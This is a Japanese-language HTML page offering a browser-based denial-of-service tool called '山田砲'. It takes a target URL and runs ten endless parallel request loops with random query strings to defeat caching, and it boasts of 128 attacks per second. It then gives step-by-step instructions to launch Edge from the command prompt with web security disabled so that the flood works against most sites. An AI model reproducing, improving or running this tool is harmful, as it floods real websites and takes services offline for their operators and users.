<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>山田砲</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
        }
    </style>
</head>
<body>
    <h1>山田砲</h1>
    <label for="url">攻撃するURL:</label>
    <input type="text" id="url" required>
    <button id="startTest">攻撃開始</button>
    <button id="stopTest">攻撃停止</button>
    <p id="status"></p>

    <script>
        let isTesting = false;

        document.getElementById('startTest').addEventListener('click', async function() {
            const url = document.getElementById('url').value;
            const status = document.getElementById('status');
            status.textContent = '攻撃を実行中...';
            isTesting = true;

            async function sendRequest() {
                while (isTesting) {
                    const randomString = generateRandomString();
                    try {
                        const response = await fetch(`${url}?query=${randomString}`);
                        if (!response.ok) {
                            console.error('エラー:', response.status);
                        }
                    } catch (error) {
                        console.error('エラー:', error);
                    }
                }
            }

            // リクエストを並行して送信
            const requestCount = 10; // 同時に送信するリクエストの数
            for (let i = 0; i < requestCount; i++) {
                sendRequest(); // 非同期リクエストを開始
            }
        });

        document.getElementById('stopTest').addEventListener('click', function() {
            isTesting = false;
            document.getElementById('status').textContent = '攻撃が停止しました。';
        });

        function generateRandomString(length = 10) {
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            let result = '';
            for (let i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() * characters.length));
            }
            return result;
        }
    </script>
   
    <p>一秒で128回攻撃できます</p>
    <p>これもそのままではほとんどのサイトが攻撃できないので</p>
    <p>1. Windows(のマーク)キー+Rキーを同時押しする。</p>
    <p>2. cmdと入力して検索する。</p>
    <p>3. コマンドプロンプトが開く。下記のコードをコピペして実行する。</p>
<pre id="commandtext">
    "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --disable-web-security --user-data-dir="C:\Windows\Temp" https://yamada-e0bw.onrender.com/
    
</pre>
</body>
</html>
